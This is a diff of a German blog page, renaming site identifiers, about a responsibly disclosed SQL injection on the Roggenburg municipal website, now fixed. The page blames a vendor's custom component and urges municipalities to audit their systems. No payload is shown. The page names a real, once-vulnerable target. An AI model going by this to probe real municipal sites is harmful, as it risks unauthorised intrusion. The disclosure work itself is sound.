+<div class="color-white paddingTop30 paddingBottom0 kesenheimer-matthias-container">
     <div class="inner container-fluid   ">
         <div class="neos-contentcollection"><div class="neos-nodetypes-html">
 	<div id="tag11"></div>
 </div>
 
 
-<div class="paddingTop30 paddingBottom15 rehme-renerehme-headline">
+<div class="paddingTop30 paddingBottom15 kesenheimer-matthias-headline">
 	<div><h1>Tag 11: Gemeinde Roggenburg</h1>
 </div>
 </div>
-<div class="paddingTop0 paddingBottom15 rehme-renerehme-text">
+<div class="paddingTop0 paddingBottom15 kesenheimer-matthias-text">
 	<div><p><strong>Organisation</strong>: <a target="_blank" rel="noopener" href="https://www.roggenburg.de/">Gemeinde Roggenburg</a><a target="_blank" rel="noopener" href="https://www.rlp.de/"> </a><br />
 <strong>Betroffene Systeme: </strong>roggenburg.de<br />
 <strong>Schwachstellenmeldung</strong>: 24. Nov. 2023 (fixed)</p>
 </div>
 </div>
 
-<div class="paddingTop0 paddingBottom15 rehme-renerehme-headline">
+<div class="paddingTop0 paddingBottom15 kesenheimer-matthias-headline">
 	<div><h2>Beschreibung</h2>
 </div>
 </div>
-<div class="paddingTop0 paddingBottom15 rehme-renerehme-text">
+<div class="paddingTop0 paddingBottom15 kesenheimer-matthias-text">
 	<div><p>Der "Zweckverband gemeindliche Datenverarbeitung" im Landkreis Neu-Ulm ist Ende 2023 Opfer eines Ransomware Angriff geworden. Mehrere Kommunen im Landkreis Neu-Ulm wurden dadurch teilweise lahmgelegt. Darunter auch die Gemeinde Roggenburg. Der BR <a target="_blank" rel="noopener" href="https://www.br.de/nachrichten/bayern/cyberattacke-auf-zwoelf-schwaebische-gemeinden,TwRIz7A">berichtete</a> über den Vorfall.</p>
 
 <p>Ich habe mir in diesem Zuge die Webseite der Gemeinde Roggenburg angeschaut. Innerhalb einer Minute konnte ich eine SQL-Injection ausfindig machen und ja, das ging tatsächlich so schnell, da mein erster Take immer die Eingabeprüfung von Input-Feldern ist. SQL-Injection ist eine kritische Sicherheitlücke, die es einem Angreifer ermöglicht mit der zugrunde liegenden Datenbank frei zu interagieren. Sie ermöglicht also den Zugriff auf alle Informatinen die darin gespeichert werden.</p>
 </div>
 </div><div class="row paddingTop0 paddingBottom30 neos-nodetypes-twocolumn">
 	<div class="col-lg-6 col-md-6 col-sm-6 col-xs-12 is-page neos-contentcollection">
-<div class="paddingTop0 paddingBottom15 rehme-renerehme-image">
+<div class="paddingTop0 paddingBottom15 kesenheimer-matthias-image">
 	
 <figure>
 	
@@ -737,26 +737,26 @@ Diese Meldung sollte mein erstes Bug Bounty sein, wo tatsächlich eine Prämie i
 </figure>
 </div></div><div class="col-lg-6 col-md-6 col-sm-6 col-xs- is-page neos-contentcollection">
 
-<div class="paddingTop0 paddingBottom15 rehme-renerehme-headline">
+<div class="paddingTop0 paddingBottom15 kesenheimer-matthias-headline">
 	<div><h2>Der BR berichtete auch über diesen Vorfall.</h2>
 </div>
 </div>
-<div class="paddingTop0 paddingBottom15 rehme-renerehme-text">
+<div class="paddingTop0 paddingBottom15 kesenheimer-matthias-text">
 	<div><p>Der Artikel ist hier zu lesen: <a target="_blank" rel="noopener" href="https://www.br.de/nachrichten/bayern/cyberangriffe-auf-kommunen-in-einer-minute-war-ich-im-system,U0t3w7t">https://www.br.de/nachrichten/bayern/cyberangriffe-auf-kommunen-in-einer-minute-war-ich-im-system</a></p>
 </div>
 </div></div>
 </div>
 
-<div class="paddingTop0 paddingBottom15 rehme-renerehme-text">
+<div class="paddingTop0 paddingBottom15 kesenheimer-matthias-text">
 	<div><p><strong>Vorweg möchte ich direkt eine Lanze brechen</strong>: Das von der Gemeinde Roggenburg verwendete Content Management System betrachte ich als ausgesprochen sicher. Die von mir entdeckte Sicherheitslücke resultierte aus einer eigenentwickelten Komponente, die vom Dienstleister bereitgestellt wurde. Die Umsetzung und Implementierung entsprachen jedoch nicht den Standards, die das System vorgibt. Das konnte man z.B. beim Suchformular durch den fehlenden CSRF-Token erahnen.</p>
 </div>
 </div>
 
-<div class="paddingTop0 paddingBottom15 rehme-renerehme-headline">
+<div class="paddingTop0 paddingBottom15 kesenheimer-matthias-headline">
 	<div><h2>Ein technischer Einblick für interessierte</h2>
 </div>
 </div>
-<div class="paddingTop0 paddingBottom15 rehme-renerehme-text">
+<div class="paddingTop0 paddingBottom15 kesenheimer-matthias-text">
 	<div><p>Neos (das verwendete System), sollte nicht als klassisches CMS verstanden werden, sondern eher als Content Application Plattform. Entwickler können mithilfe von NodeTypes und Fusion ihre eigenen Inhaltselemente erstellen. Diese können dann von Redakteuren über das Backend zur Contentpflege genutzt werden. Die traditionelle Umsetzung von Elementen erfordert in technischer Hinsicht also keine Programmierung in PHP oder gar SQL.</p>
 
 <p><strong>Warum war eine SQL Injection möglich?</strong></p>
@@ -785,20 +785,20 @@ Diese Meldung sollte mein erstes Bug Bounty sein, wo tatsächlich eine Prämie i
 </div>
 </div>
 
-<div class="paddingTop0 paddingBottom15 rehme-renerehme-headline">
+<div class="paddingTop0 paddingBottom15 kesenheimer-matthias-headline">
 	<div><h2>Long story short</h2>
 </div>
 </div>
-<div class="paddingTop0 paddingBottom15 rehme-renerehme-text">
+<div class="paddingTop0 paddingBottom15 kesenheimer-matthias-text">
 	<div><p>Eine vulnerable Third-Party Komponente, welche Sicherheitslücken eröffnet, wird bei jedem (!) System Türen für Angreifer öffnen. Ich <a href="https://mkesenheimer.github.io/blog/informationssicherheit-in-den-kommunen">untersuche nun seit drei Jahren</a> immer wieder kommunale Webapplikationen und muss unter dem Strich feststellen, dass so gut wie nie das zugrundeliegende System an sich vulnerabel ist, sondern entweder Fehlkonfigurationen oder Eigenentwicklungen in Form von Erweiterungen, Plugins bzw. Extensions durch die jeweiligen Dienstleister, welche Sicherheitslücken eröffneten.</p>
 </div>
 </div>
 
-<div class="paddingTop0 paddingBottom15 rehme-renerehme-headline">
+<div class="paddingTop0 paddingBottom15 kesenheimer-matthias-headline">
 	<div><h2>Liebe Kommunalvertretung</h2>
 </div>
 </div>
-<div class="paddingTop0 paddingBottom15 rehme-renerehme-text">
+<div class="paddingTop0 paddingBottom15 kesenheimer-matthias-text">
 	<div><p>Open Source-Produkte sollten meiner Meinung nach immer bevorzugt werden. Durch den öffentlich einsehbaren Quellcode ist in der Regel gewährleistet, dass, abhängig von der Popularität, eine vielzahl an Entwickler:innen den Code überprüfen, was eine höhere Sicherheit bietet als bei einem geschlossenen System, das in den Händen von ein paar Entwickler:innen liegt. Systeme wie Neos, TYPO3 oder Drupal sowie Eigenentwicklungen auf Basis von Frameworks wie Neos Flow, Laravel oder Symfony können durchaus <strong>sicher</strong> betrieben werden. Der entscheidende Punkt liegt jedoch immer beim verantwortlichen Dienstleister, der auf Basis dieser Systeme Webapplikationen umsetzt und mit eigener Programmierung "ergänzt". Eine Kommune kann die Qualität in der Regel nicht selbst kontrollieren - klar. Daher ist es ratsam, produktive Systeme, die sensible Daten verarbeiten, entweder einem Penetrationstest oder einem Code-Audit von einem unabhängigen Dienstleister unterziehen zu lassen.</p>
 
 <p><strong>Auch wenn Sie hohe Ansprüche und Erwartungen an ein System haben, ist eine entsprechende Beachtung in der "eigenen" Entwicklung unerlässlich. Weder ein Standard noch eine ISO-Zertifizierung wird Sie vor einem erfolgreichen Angriff schützen, wenn sich durch Nachlässigkeit oder Unwissenheit Sicherheitslücken ergeben.</strong><br />
@@ -809,10 +809,10 @@ Achja. Sollte Ihnen jemand Wordpress andrehen wollen, dann verbannen Sie das Ang
     </div>
 </div>
 
-<div class="color-white paddingTop30 paddingBottom30 rehme-renerehme-container">
+<div class="color-white paddingTop30 paddingBottom30 kesenheimer-matthias-container">
     <div class="inner container-fluid   ">
         <div class="neos-contentcollection">
-<div class="paddingTop15 paddingBottom30 rehme-renerehme-text">
+<div class="paddingTop15 paddingBottom30 kesenheimer-matthias-text">
 	<div><h3><strong>Further publications have been interrupted for current reasons. As long as an ethical hacker has to fear legal consequences when responsibly disclosing security vulnerabilities, I will not be able to continue here. <a target="_blank" rel="noopener" href="https://www.heise.de/meinung/Kommentar-zu-Modern-Solution-Der-Hackerparagraf-muss-endlich-weg-9602664.html">Finally reform the hacker paragraph</a> ...</strong></h3>
 </div>
 </div></div>
@@ -847,7 +847,7 @@ Achja. Sollte Ihnen jemand Wordpress andrehen wollen, dann verbannen Sie das Ang
 			<div class="copy">
 				<div class="inner">
 					<div class="neos-contentcollection">
-<div class="paddingTop15 paddingBottom15 rehme-renerehme-text">
+<div class="paddingTop15 paddingBottom15 kesenheimer-matthias-text">
 	<div><p style="text-align:center">This website is powered by&nbsp;<a target="_blank" rel="noopener" href="https://neos.io">Neos</a><br />
 <a href="/impressum">Impressum</a> | <a href="/datenschutz">Datenschutz</a></p>
 </div>
@@ -856,4 +856,4 @@ Achja. Sollte Ihnen jemand Wordpress andrehen wollen, dann verbannen Sie das Ang
 			</div>
 		</section>
 	</div>
-<script data-neos-node="/sites/rehme-renerehme/node-auh0tef0k5fuq/node-wmaycdh5qflf6@live;language=de" src="https://mkesenheimer.github.io/_Resources/Static/Packages/Neos.Neos/JavaScript/LastVisitedNode.js" async></script></body></html>
+<script data-neos-node="/sites/kesenheimer-matthias/node-auh0tef0k5fuq/node-wmaycdh5qflf6@live;language=de" src="https://mkesenheimer.github.io/_Resources/Static/Packages/Neos.Neos/JavaScript/LastVisitedNode.js" async></script></body></html>
